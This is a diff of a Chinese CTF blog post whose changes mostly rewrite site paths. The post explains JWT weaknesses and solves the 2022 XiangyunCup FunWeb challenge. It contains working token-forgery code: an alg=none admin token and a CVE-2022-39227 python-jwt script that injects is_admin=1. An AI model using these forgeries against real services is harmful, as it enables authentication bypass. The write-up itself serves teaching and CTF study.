@@ -19,7 +19,7 @@
     <meta name="description" content="针对祥云杯中一道基于pythonJWT的Nday题目，谈谈Jwt和它存在的一些安全问题">
 <meta property="og:type" content="article">
 <meta property="og:title" content="From Jwt To The XiangYunCup FunWeb">
-<meta property="og:url" content="https://github.com/ProbiusOfficial/ProbiusOfficial.github.io/2022/11/20/From-Jwt-To-The-XiangYunCup-FunWeb/index.html">
+<meta property="og:url" content="https://blog.probius.xyz/2022/11/20/From-Jwt-To-The-XiangYunCup-FunWeb/index.html">
 <meta property="og:site_name" content="Probius_Official&#39;s Blog">
 <meta property="og:description" content="针对祥云杯中一道基于pythonJWT的Nday题目，谈谈Jwt和它存在的一些安全问题">
 <meta property="og:locale" content="zh_CN">
@@ -59,12 +59,12 @@
 <link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
 
 
-<link  rel="stylesheet" href="/ProbiusOfficial/ProbiusOfficial.github.io/css/main.css" />
+<link  rel="stylesheet" href="/css/main.css" />
 
 
-  <link id="highlight-css" rel="stylesheet" href="/ProbiusOfficial/ProbiusOfficial.github.io/css/highlight.css" />
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
   
-    <link id="highlight-css-dark" rel="stylesheet" href="/ProbiusOfficial/ProbiusOfficial.github.io/css/highlight-dark.css" />
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
   
 
 
@@ -73,15 +73,15 @@
   <script id="fluid-configs">
     var Fluid = window.Fluid || {};
     Fluid.ctx = Object.assign({}, Fluid.ctx)
-    var CONFIG = {"hostname":"github.com","root":"/ProbiusOfficial/ProbiusOfficial.github.io/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":"§"},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":"G-Z6B9XVRJ8K","gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/ProbiusOfficial/ProbiusOfficial.github.io/local-search.xml"};
+    var CONFIG = {"hostname":"blog.probius.xyz","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":"§"},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":"G-Z6B9XVRJ8K","gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
 
     if (CONFIG.web_analytics.follow_dnt) {
       var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
       Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
     }
   </script>
-  <script  src="/ProbiusOfficial/ProbiusOfficial.github.io/js/utils.js" ></script>
-  <script  src="/ProbiusOfficial/ProbiusOfficial.github.io/js/color-schema.js" ></script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
   
 
   
@@ -125,7 +125,7 @@
 <div class="header-inner" style="height: 70vh;">
   <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
   <div class="container">
-    <a class="navbar-brand" href="/ProbiusOfficial/ProbiusOfficial.github.io/">
+    <a class="navbar-brand" href="/">
       <strong>探姬の星灵枢纽</strong>
     </a>
 
@@ -144,7 +144,7 @@
           
           
             <li class="nav-item">
-              <a class="nav-link" href="/ProbiusOfficial/ProbiusOfficial.github.io/">
+              <a class="nav-link" href="/">
                 <i class="iconfont icon-home-fill"></i>
                 <span>首页</span>
               </a>
@@ -156,7 +156,7 @@
           
           
             <li class="nav-item">
-              <a class="nav-link" href="/ProbiusOfficial/ProbiusOfficial.github.io/archives/">
+              <a class="nav-link" href="/archives/">
                 <i class="iconfont icon-archive-fill"></i>
                 <span>归档</span>
               </a>
@@ -168,7 +168,7 @@
           
           
             <li class="nav-item">
-              <a class="nav-link" href="/ProbiusOfficial/ProbiusOfficial.github.io/categories/">
+              <a class="nav-link" href="/categories/">
                 <i class="iconfont icon-category-fill"></i>
                 <span>分类</span>
               </a>
@@ -180,7 +180,7 @@
           
           
             <li class="nav-item">
-              <a class="nav-link" href="/ProbiusOfficial/ProbiusOfficial.github.io/tags/">
+              <a class="nav-link" href="/tags/">
                 <i class="iconfont icon-tags-fill"></i>
                 <span>标签</span>
               </a>
@@ -192,7 +192,7 @@
           
           
             <li class="nav-item">
-              <a class="nav-link" href="/ProbiusOfficial/ProbiusOfficial.github.io/about/">
+              <a class="nav-link" href="/about/">
                 <i class="iconfont icon-user-fill"></i>
                 <span>关于</span>
               </a>
@@ -204,7 +204,7 @@
           
           
             <li class="nav-item">
-              <a class="nav-link" href="/ProbiusOfficial/ProbiusOfficial.github.io/links/">
+              <a class="nav-link" href="/links/">
                 <i class="iconfont icon-link-fill"></i>
                 <span>友链</span>
               </a>
@@ -326,7 +326,7 @@
               <div class="markdown-body">
                 
                 <h2 id="About-JWT"><a href="#About-JWT" class="headerlink" title="About JWT"></a>About JWT</h2><h3 id="What-is-JWT"><a href="#What-is-JWT" class="headerlink" title="What is JWT"></a>What is JWT</h3><p>Json Web Token(<code>JWT</code>)是一个开放标准(<a target="_blank" rel="noopener" href="https://www.rfc-editor.org/rfc/rfc7519">RFC 7519</a>)，它定义了一种紧凑且自包含的方式，用于在各方之间安全地传输信息作为JSON对象。此信息可以验证和信任，因为它足数字签名的。JWT可以使用密钥(使用 HMAC算法)或便用RSA或 ECDSA 的公钥&#x2F;私钥对进行签名。</p>
-<p><img src="https://nssctf.wdf.ink//img/WDTJ/1667407544497-f7e889c1-fedb-474e-bd81-57d3cdeb67a1.png" srcset="/ProbiusOfficial/ProbiusOfficial.github.io/img/loading.gif" lazyload alt="img"></p>
+<p><img src="https://nssctf.wdf.ink//img/WDTJ/1667407544497-f7e889c1-fedb-474e-bd81-57d3cdeb67a1.png" srcset="/img/loading.gif" lazyload alt="img"></p>
 <p>注意：本文的重心并不在介绍JWT上，所以在官方文本的基础上会有一些删减。</p>
 <p>如需了解更多，可以访问起官方网站，翻阅对应的文献资料：</p>
 <p><a target="_blank" rel="noopener" href="https://jwt.io/introduction">https://jwt.io/introduction</a></p>
@@ -335,9 +335,9 @@
 <h3 id="JWT-format"><a href="#JWT-format" class="headerlink" title="JWT format"></a>JWT format</h3><p>JWT的格式大致如下：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">Header.Payload.Signature<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://nssctf.wdf.ink//img/WDTJ/1667409378048-06076958-9b69-42c2-8f0a-2809a7b250b3.png" srcset="/ProbiusOfficial/ProbiusOfficial.github.io/img/loading.gif" lazyload alt="img"></p>
+<p><img src="https://nssctf.wdf.ink//img/WDTJ/1667409378048-06076958-9b69-42c2-8f0a-2809a7b250b3.png" srcset="/img/loading.gif" lazyload alt="img"></p>
 <p>对于任意JWT令牌，我们可以在jwt.io官网或者其他jwt解码工具查看详细：</p>
-<p><img src="https://nssctf.wdf.ink//img/WDTJ/1667412576430-2fd13d4e-8f7f-4cb6-b084-e8e9d5b7036c.png" srcset="/ProbiusOfficial/ProbiusOfficial.github.io/img/loading.gif" lazyload alt="img"></p>
+<p><img src="https://nssctf.wdf.ink//img/WDTJ/1667412576430-2fd13d4e-8f7f-4cb6-b084-e8e9d5b7036c.png" srcset="/img/loading.gif" lazyload alt="img"></p>
 <h4 id="Header"><a href="#Header" class="headerlink" title="Header"></a>Header</h4><p><code>JWT头</code>是一个描述JWT元数据的<code>JSON对象</code>，<code>alg属性</code>表示签名使用的算法，默认为HMAC SHA256（写为HS256）；<code>typ属性</code>表示令牌的类型，JWT令牌统一写为JWT。</p>
 <p>最后，使用Base64 URL算法将上述JSON对象转换为字符串保存</p>
 <figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;alg&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;HS256&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;typ&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;JWT&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>
@@ -375,7 +375,7 @@
 <p><a target="_blank" rel="noopener" href="https://jwt.io/libraries">https://jwt.io/libraries</a></p>
 <h3 id="Use"><a href="#Use" class="headerlink" title="Use"></a>Use</h3><p>如果您想知道如何将JWT用于开发中，请移步另一篇文章：(写作中……)</p>
 <h3 id="Verification"><a href="#Verification" class="headerlink" title="Verification"></a>Verification</h3><p>JWT的后端验证是比较多样的，大概的流程可以参考下图：</p>
-<p><img src="https://nssctf.wdf.ink//img/WDTJ/1667832274679-a093cb89-0329-4557-9917-46ad794742b5.png" srcset="/ProbiusOfficial/ProbiusOfficial.github.io/img/loading.gif" lazyload alt="img"></p>
+<p><img src="https://nssctf.wdf.ink//img/WDTJ/1667832274679-a093cb89-0329-4557-9917-46ad794742b5.png" srcset="/img/loading.gif" lazyload alt="img"></p>
 <p>这也是说JWT的后端验证多样的原因，如何利用JWT的信息和signature综合的去验证JWT的有效性，在开发者选择使用JWT的适合就要做好相应的准备——生成和验证是一体的。</p>
 <h2 id="Common-Security-risk-of-JWT"><a href="#Common-Security-risk-of-JWT" class="headerlink" title="Common Security risk of JWT"></a>Common Security risk of JWT</h2><p>在简单了解了JWT之后，我们来看看JWT常见的一些安全风险：</p>
 <h3 id="敏感信息泄露"><a href="#敏感信息泄露" class="headerlink" title="敏感信息泄露"></a>敏感信息泄露</h3><p>如果不当的使用Header和Payload部分，在其中存储一些敏感信息，可能会产生一定安全风险，因为两者只经过简单的base64编码。</p>
@@ -393,7 +393,7 @@
 <p>比如2022年首届数据安全题目中的一道web题，我们就可以通过该方法伪造token。</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 可以通过令algorithm为空，绕过对签名和密钥的检验</span><br><span class="hljs-keyword">import</span> jwt<br>payload = &#123;<br><span class="hljs-string">&#x27;username&#x27;</span>: <span class="hljs-string">&#x27;admin&#x27;</span><br>&#125;<br>token = jwt.encode(payload=payload,algorithm=<span class="hljs-literal">None</span>,key=<span class="hljs-literal">None</span>)<br><span class="hljs-built_in">print</span>(token)<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0.</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="https://nssctf.wdf.ink//img/WDTJ/1667835816438-f3804cff-1113-48bf-87d2-c39f6138eb8d.png" srcset="/ProbiusOfficial/ProbiusOfficial.github.io/img/loading.gif" lazyload alt="img"></p>
+<p><img src="https://nssctf.wdf.ink//img/WDTJ/1667835816438-f3804cff-1113-48bf-87d2-c39f6138eb8d.png" srcset="/img/loading.gif" lazyload alt="img"></p>
 <h4 id="非对称密码算法修改为对称算法-密钥混淆CVE-2016-10555"><a href="#非对称密码算法修改为对称算法-密钥混淆CVE-2016-10555" class="headerlink" title="非对称密码算法修改为对称算法(密钥混淆CVE-2016-10555)"></a>非对称密码算法修改为对称算法(密钥混淆CVE-2016-10555)</h4><p>HMAC和RSA是JWT比较常见的两种算法。</p>
 <p>HMAC：token使用密钥签名，然后使用相同的密钥进行验证。（对称）</p>
 <p>RSA    ：token将首先使用私钥创建，然后使用相应的公钥进行验证。（非对称）</p>
@@ -407,7 +407,7 @@
 <p>比如：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoicHJvYml1cyIsImFjdGlvbiI6InByb2ZpbGUifQ<span class="hljs-number">.5</span>GVEWIw7-IdM9fQMt6H5Wxpmp1HpnyQb33CsXnZ9qKM<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://nssctf.wdf.ink//img/WDTJ/1667840468890-8287cdc1-a5bd-4d5b-ba08-abc6165b11b8.png" srcset="/ProbiusOfficial/ProbiusOfficial.github.io/img/loading.gif" lazyload alt="img"></p>
+<p><img src="https://nssctf.wdf.ink//img/WDTJ/1667840468890-8287cdc1-a5bd-4d5b-ba08-abc6165b11b8.png" srcset="/img/loading.gif" lazyload alt="img"></p>
 <p>如果我们直接修改payload段，使用修改后的token重放，如访问页面正常，则说明漏洞存在。</p>
 <h3 id="伪造密钥-CVE-2018-0114"><a href="#伪造密钥-CVE-2018-0114" class="headerlink" title="伪造密钥(CVE-2018-0114)"></a>伪造密钥(CVE-2018-0114)</h3><p>jwk是header里的一个参数，用于指出密钥，存在被伪造的风险。</p>
 <p>比如CVE-2018-0114： </p>
@@ -444,18 +444,18 @@
 
 <h4 id="操纵X5U，X5C-URL"><a href="#操纵X5U，X5C-URL" class="headerlink" title="操纵X5U，X5C URL"></a>操纵X5U，X5C URL</h4><p>同JKU或JWK头部类似，x5u和x5c头部参数允许攻击者用于验证Token的公钥证书或证书链。x5u以URI形式指定信息，而x5c允许将证书值嵌入token中。</p>
 <h2 id="JWTtool"><a href="#JWTtool" class="headerlink" title="JWTtool"></a>JWTtool</h2><p>如果您需要对您使用JWT的网站进行安全测试，这里也有对应的工具，比如JWTtool，上述常见的JWT漏洞都可以使用该工具进行利用：</p>
-<p><a href="https://github.com/ticarpi/jwt_tool">https://github.com/ticarpi/jwt_tool</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/ticarpi/jwt_tool">https://github.com/ticarpi/jwt_tool</a></p>
 <p>同时你也能在该项目的Wiki网站上获取更多jwt的知识：</p>
-<p><a href="https://github.com/ticarpi/jwt_tool/wiki">https://github.com/ticarpi/jwt_tool/wiki</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/ticarpi/jwt_tool/wiki">https://github.com/ticarpi/jwt_tool/wiki</a></p>
 <h2 id="2022-XiangyunCup-FunWeb"><a href="#2022-XiangyunCup-FunWeb" class="headerlink" title="2022 XiangyunCup FunWeb"></a>2022 XiangyunCup FunWeb</h2><p>我们来看看2022年祥云杯的Web题——FunWeb。</p>
 <p>这道题并没有考察传统的JWT漏洞 而是选择一个比较新的 1day (CVE-2022-39227 )来出题。</p>
 <p>经典的开局一个登录框，登录页面抓包后先跑了admin的弱口令，当然现在的题一般没这么容易，并没有结果。</p>
 <p>老老实实注册进去，有两个可以点的，一个是查看flag，一个是查看成绩，点击之后发现都需要admin身份，所以抓包分析看到了一下，发现<code>xxx.yyy.zzz</code>的token结构，下意识就去jwt.io解码了：</p>
-<p><img src="https://nssctf.wdf.ink//img/WDTJ/1667845643643-eebf4026-3cc5-4319-a90a-583b1cdc0edf.png" srcset="/ProbiusOfficial/ProbiusOfficial.github.io/img/loading.gif" lazyload alt="img"></p>
+<p><img src="https://nssctf.wdf.ink//img/WDTJ/1667845643643-eebf4026-3cc5-4319-a90a-583b1cdc0edf.png" srcset="/img/loading.gif" lazyload alt="img"></p>
 <p>从payload可以判断大概这里就是突破点。</p>
 <p>当然面对这样一道JWT的题目，常规攻击手段肯定是首选，不过这样的题目，如果常规打不下来，就得考虑在github上面找commit了。</p>
 <p>所以在一天常规攻击无果后，于是开始找最近有关jwt的day，然后队里另外一位师傅翻到了python jwt的1day，也就是CVE-2022-39227</p>
-<p><a href="https://github.com/davedoesdev/python-jwt/commit/88ad9e67c53aa5f7c43ec4aa52ed34b7930068c9">https://github.com/davedoesdev/python-jwt/commit/88ad9e67c53aa5f7c43ec4aa52ed34b7930068c9</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/davedoesdev/python-jwt/commit/88ad9e67c53aa5f7c43ec4aa52ed34b7930068c9">https://github.com/davedoesdev/python-jwt/commit/88ad9e67c53aa5f7c43ec4aa52ed34b7930068c9</a></p>
 <p>拉到最后我们可以看到作者在test中提供了漏洞POC：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;&quot;&quot; Test claim forgery vulnerability fix &quot;&quot;&quot;</span><br><span class="hljs-keyword">from</span> datetime <span class="hljs-keyword">import</span> timedelta<br><span class="hljs-keyword">from</span> json <span class="hljs-keyword">import</span> loads, dumps<br><span class="hljs-keyword">from</span> test.common <span class="hljs-keyword">import</span> generated_keys<br><span class="hljs-keyword">from</span> test <span class="hljs-keyword">import</span> python_jwt <span class="hljs-keyword">as</span> jwt<br><span class="hljs-keyword">from</span> pyvows <span class="hljs-keyword">import</span> Vows, expect<br><span class="hljs-keyword">from</span> jwcrypto.common <span class="hljs-keyword">import</span> base64url_decode, base64url_encode<br><br><span class="hljs-meta">@Vows.batch</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">ForgedClaims</span>(Vows.Context):<br>    <span class="hljs-string">&quot;&quot;&quot; Check we get an error when payload is forged using mix of compact and JSON formats &quot;&quot;&quot;</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">topic</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-string">&quot;&quot;&quot; Generate token &quot;&quot;&quot;</span><br>        payload = &#123;<span class="hljs-string">&#x27;sub&#x27;</span>: <span class="hljs-string">&#x27;alice&#x27;</span>&#125;<br>        <span class="hljs-keyword">return</span> jwt.generate_jwt(payload, generated_keys[<span class="hljs-string">&#x27;PS256&#x27;</span>], <span class="hljs-string">&#x27;PS256&#x27;</span>, timedelta(minutes=<span class="hljs-number">60</span>))<br><br>    <span class="hljs-keyword">class</span> <span class="hljs-title class_">PolyglotToken</span>(Vows.Context):<br>        <span class="hljs-string">&quot;&quot;&quot; Make a forged token &quot;&quot;&quot;</span><br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">topic</span>(<span class="hljs-params">self, topic</span>):<br>            <span class="hljs-string">&quot;&quot;&quot; Use mix of JSON and compact format to insert forged claims including long expiration &quot;&quot;&quot;</span><br>            [header, payload, signature] = topic.split(<span class="hljs-string">&#x27;.&#x27;</span>)<br>            parsed_payload = loads(base64url_decode(payload))<br>            parsed_payload[<span class="hljs-string">&#x27;sub&#x27;</span>] = <span class="hljs-string">&#x27;bob&#x27;</span><br>            parsed_payload[<span class="hljs-string">&#x27;exp&#x27;</span>] = <span class="hljs-number">2000000000</span><br>            fake_payload = base64url_encode((dumps(parsed_payload, separators=(<span class="hljs-string">&#x27;,&#x27;</span>, <span class="hljs-string">&#x27;:&#x27;</span>))))<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#123;&quot;  &#x27;</span> + header + <span class="hljs-string">&#x27;.&#x27;</span> + fake_payload + <span class="hljs-string">&#x27;.&quot;:&quot;&quot;,&quot;protected&quot;:&quot;&#x27;</span> + header + <span class="hljs-string">&#x27;&quot;, &quot;payload&quot;:&quot;&#x27;</span> + payload + <span class="hljs-string">&#x27;&quot;,&quot;signature&quot;:&quot;&#x27;</span> + signature + <span class="hljs-string">&#x27;&quot;&#125;&#x27;</span><br><br>        <span class="hljs-keyword">class</span> <span class="hljs-title class_">Verify</span>(Vows.Context):<br>            <span class="hljs-string">&quot;&quot;&quot; Check the forged token fails to verify &quot;&quot;&quot;</span><br><span class="hljs-meta">            @Vows.capture_error</span><br>            <span class="hljs-keyword">def</span> <span class="hljs-title function_">topic</span>(<span class="hljs-params">self, topic</span>):<br>                <span class="hljs-string">&quot;&quot;&quot; Verify the forged token &quot;&quot;&quot;</span><br>                <span class="hljs-keyword">return</span> jwt.verify_jwt(topic, generated_keys[<span class="hljs-string">&#x27;PS256&#x27;</span>], [<span class="hljs-string">&#x27;PS256&#x27;</span>])<br><br>            <span class="hljs-keyword">def</span> <span class="hljs-title function_">token_should_not_verify</span>(<span class="hljs-params">self, r</span>):<br>                <span class="hljs-string">&quot;&quot;&quot; Check the token doesn&#x27;t verify due to mixed format being detected &quot;&quot;&quot;</span><br>                expect(r).to_be_an_error()<br>                expect(<span class="hljs-built_in">str</span>(r)).to_equal(<span class="hljs-string">&#x27;invalid JWT format&#x27;</span>)<br></code></pre></td></tr></table></figure>
 
@@ -464,20 +464,20 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> datetime <span class="hljs-keyword">import</span> timedelta<br><span class="hljs-keyword">from</span> json <span class="hljs-keyword">import</span> loads, dumps<br><span class="hljs-keyword">from</span> common <span class="hljs-keyword">import</span> generated_keys<br><span class="hljs-keyword">import</span> python_jwt <span class="hljs-keyword">as</span> jwt<br><span class="hljs-keyword">from</span> pyvows <span class="hljs-keyword">import</span> Vows, expect<br><span class="hljs-keyword">from</span> jwcrypto.common <span class="hljs-keyword">import</span> base64url_decode, base64url_encode<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">topic</span>(<span class="hljs-params">topic</span>):<br>    <span class="hljs-string">&quot;&quot;&quot; Use mix of JSON and compact format to insert forged claims including long expiration &quot;&quot;&quot;</span><br>    [header, payload, signature] = topic.split(<span class="hljs-string">&#x27;.&#x27;</span>)<br>    parsed_payload = loads(base64url_decode(payload))<br>    parsed_payload[<span class="hljs-string">&#x27;is_admin&#x27;</span>] = <span class="hljs-number">1</span><br>    parsed_payload[<span class="hljs-string">&#x27;exp&#x27;</span>] = <span class="hljs-number">2000000000</span><br>    fake_payload = base64url_encode(<br>        (dumps(parsed_payload, separators=(<span class="hljs-string">&#x27;,&#x27;</span>, <span class="hljs-string">&#x27;:&#x27;</span>))))<br>    <span class="hljs-comment"># print (header+ &#x27;.&#x27; +fake_payload+ &#x27;.&#x27; +signature)</span><br>    <span class="hljs-comment"># print (header+ &#x27;.&#x27; + payload+ &#x27;.&#x27; +signature)</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#123;&quot;  &#x27;</span> + header + <span class="hljs-string">&#x27;.&#x27;</span> + fake_payload + <span class="hljs-string">&#x27;.&quot;:&quot;&quot;,&quot;protected&quot;:&quot;&#x27;</span> + header + <span class="hljs-string">&#x27;&quot;, &quot;payload&quot;:&quot;&#x27;</span> + payload + <span class="hljs-string">&#x27;&quot;,&quot;signature&quot;:&quot;&#x27;</span> + signature + <span class="hljs-string">&#x27;&quot;&#125;&#x27;</span><br><br>originaltoken = <span class="hljs-string">&#x27;&#x27;&#x27;eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2NjcxNDE5MTUsImlhdCI6MTY2NzE0MTYxNSwiaXNfYWRtaW4iOjAsImlzX2xvZ2luIjoxLCJqdGkiOiI1dnBYUmNpck1semxNUG54MHNTWDd3IiwibmJmIjoxNjY3MTQxNjE1LCJwYXNzd29yZCI6ImY2MWQiLCJ1c2VybmFtZSI6ImY2MWQifQ.cqQ2RVegORBfB_fo33birEJs8Tw8WDM7wIYwfXz_BpW6gQG99cl-DePmP6iNx5Mf0aCwDcuqS-wOXjis7JVmhpf8dmdYkP_gLvYMULpPcFX03j70Cu3bhMWSAGUMjt_IFGQ1-xfwYp1LI9SWAlBM5wDPCh-gi96abRDvhRW-c-6mFul2us_XKl7kyceT2fY2ABrcJRSKA91kLm3ZOcD4FA6yuHMyKVfmN9RqPtzvvUVutniv03XPFTGIzHudzswRc0b3nN-XMsnyi_Ca62T8CVb1MMEDPVlDM7CDJmJXGfoNimkrOhPi22SItpv4tO7u-bbene3PpvW1Lv7UEQeDBg&#x27;&#x27;&#x27;</span><br><br>topic = topic(originaltoken)<br><span class="hljs-built_in">print</span>(topic)<br></code></pre></td></tr></table></figure>
 
 <p>利用生成的json当作token传参即可绕过：</p>
-<p><img src="https://nssctf.wdf.ink//img/WDTJ/1667847065180-579c6d06-711c-4c2b-acdc-8bc854a46812.png" srcset="/ProbiusOfficial/ProbiusOfficial.github.io/img/loading.gif" lazyload alt="img"></p>
+<p><img src="https://nssctf.wdf.ink//img/WDTJ/1667847065180-579c6d06-711c-4c2b-acdc-8bc854a46812.png" srcset="/img/loading.gif" lazyload alt="img"></p>
 <p>JWT的部分其实到这就结束了，后面如何拿flag就涉及到grahql的一个注入了，如果有时间，我会在下一篇文章总结一些SQL注入的知识。</p>
 <h2 id="From-FunWeb-to-CVE-2022-39227-vulnerability-analysis"><a href="#From-FunWeb-to-CVE-2022-39227-vulnerability-analysis" class="headerlink" title="From FunWeb to CVE-2022-39227 vulnerability analysis"></a>From FunWeb to CVE-2022-39227 vulnerability analysis</h2><p>本来还想着要分析，最近时间不是很够，敲好J1an师傅直接把文档炫我嘴里了（，</p>
-<p><img src="https://nssctf.wdf.ink//img/WDTJ/1667847767154-29fdc9b4-817c-4e39-9ba6-80335b838f62.png" srcset="/ProbiusOfficial/ProbiusOfficial.github.io/img/loading.gif" lazyload alt="img"></p>
-<p><img src="https://nssctf.wdf.ink//img/WDTJ/1667847750329-8f0cc9f5-9ae8-46d8-bad9-555ee2173e64.png" srcset="/ProbiusOfficial/ProbiusOfficial.github.io/img/loading.gif" lazyload alt="img"></p>
+<p><img src="https://nssctf.wdf.ink//img/WDTJ/1667847767154-29fdc9b4-817c-4e39-9ba6-80335b838f62.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><img src="https://nssctf.wdf.ink//img/WDTJ/1667847750329-8f0cc9f5-9ae8-46d8-bad9-555ee2173e64.png" srcset="/img/loading.gif" lazyload alt="img"></p>
 <p>那这里原理分析我就直接使用J1an师傅的文章啦：</p>
 <p>原文地址：<a target="_blank" rel="noopener" href="https://forum.butian.net/share/1990">https://forum.butian.net/share/1990</a> 过审了所以添上了ww</p>
 <p><a target="_blank" rel="noopener" href="https://www.yuque.com/attachments/yuque/0/2022/pdf/21803058/1667847629252-562bc55d-8161-4c32-a5ff-1cad49da7960.pdf">奇安信攻防社区-CVE-2022-39227漏洞分析.pdf</a></p>
 <h2 id="Other-Jwt-topics"><a href="#Other-Jwt-topics" class="headerlink" title="Other Jwt topics"></a>Other Jwt topics</h2><h3 id="HFCTF2020-EasyLogin"><a href="#HFCTF2020-EasyLogin" class="headerlink" title="[HFCTF2020]EasyLogin"></a>[HFCTF2020]EasyLogin</h3><p>该WriteUp来源：<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/0f76e1c69e33">https://www.jianshu.com/p/0f76e1c69e33</a></p>
